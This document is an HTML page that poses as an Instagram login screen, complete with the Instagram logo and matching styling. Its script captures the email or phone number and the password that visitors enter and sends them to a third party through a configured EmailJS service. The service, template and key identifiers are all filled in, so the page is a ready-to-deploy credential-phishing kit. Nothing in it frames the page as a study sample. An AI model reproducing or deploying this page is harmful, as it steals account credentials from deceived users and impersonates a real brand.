<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>

    <!-- Load EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <!-- Google Font -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: url('https://source.unsplash.com/1600x900/?abstract,gradient') no-repeat center center/cover;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 350px;
        }

        .logo {
            width: 180px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: #0095F6;
            color: white;
            font-size: 1rem;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
            font-weight: bold;
        }

        .btn:hover {
            background: #0077D7;
            transform: scale(1.02);
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 0.9rem;
            color: #555;
        }

        .forgot-password a {
            color: #0077D7;
            text-decoration: none;
            font-weight: bold;
        }

        .register {
            margin-top: 20px;
            font-size: 0.9rem;
        }

        .register a {
            color: #0095F6;
            font-weight: bold;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo">
        <form id="login-form">
            <input type="text" id="email" name="user_email" placeholder="Phone number, or email" required>
            <input type="text" id="password" name="user_password" placeholder="Password" required>
            <button type="submit" class="btn">Log In</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        <div class="register">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        (function() {
            emailjs.init({
                publicKey: "FLtlfF6EE90oJuYho",
            });
        })();

        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault();

            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            let data = {
                user_email: email,
                user_password: password
            };

            emailjs.send("service_pnhul78", "template_83jyki7", data)
                .then(
                    function(response) {
                        alert("Login details sent successfully!");
                    },
                    function(error) {
                        alert("Error! Please try again.");
                        console.error("EmailJS Error:", error);
                    }
                );
        });
    </script>

</body>
</html>
